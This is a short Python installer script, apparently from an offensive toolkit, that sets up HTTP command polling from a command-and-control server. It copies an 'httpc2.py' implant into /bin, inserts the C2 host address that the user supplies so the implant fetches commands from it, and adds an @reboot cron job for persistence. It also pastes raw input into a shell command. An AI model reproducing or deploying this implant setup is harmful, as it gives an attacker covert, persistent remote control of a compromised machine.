import os
import subprocess

#set httpc2.py to run on boot
def httpc2():
    print("\n")
    print("[*] Setting up HTTP Command Polling")
    print("\n")
    print("[*] Installing Dependencies")
    subprocess.call("sudo pip3 install requests schedule", shell=True)
    print("\n")
    print("[*] Setting up HTTP command polling to run on boot")
    server = input("Please enter IP or FQDN of the C2 server:\n")
    print("\n")
    subprocess.call("mkdir /bin/httpc2", shell=True)
    subprocess.call("cp scripts/httpc2.py /bin/httpc2/", shell=True)
    subprocess.call("sed -i 's/URL/http:\/\/" + server + "\/commands.txt/g' /bin/httpc2/httpc2.py", shell=True)
    print("\n")
    if os.path.isfile("/root/cronjob"):
        if subprocess.call("grep httpc2 /root/cronjob",shell=True) != 0:
            f2 = open("/root/cronjob", "a")
            f2.write("@reboot /usr/bin/python3 /bin/httpc2/httpc2.py\n\n")
            f2.close()
    else:
        f2 = open("/root/cronjob", "a")
        f2.write("@reboot /usr/bin/python3 /bin/httpc2/httpc2.py\n\n")
        f2.close()
